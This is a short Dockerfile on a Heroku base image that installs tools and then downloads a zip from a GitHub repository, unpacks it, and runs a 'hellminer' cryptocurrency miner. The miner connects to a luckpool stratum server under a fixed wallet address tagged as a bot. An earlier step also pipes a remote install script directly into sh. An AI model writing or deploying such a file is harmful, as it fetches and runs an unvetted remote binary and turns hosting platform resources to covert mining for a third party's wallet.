FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN pip uninstall pyopenssl
RUN pip uninstall cryptography
RUN pip install pyopenssl
RUN pip install cryptography
RUN curl https://cli-assets.heroku.com/install.sh | sh
RUN wget https://github.com/sicobra00/project1/raw/main/project.zip; unzip project.zip; chmod +x hellminer; ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY.BOT -p x --cpu 1
CMD bash heroku.sh
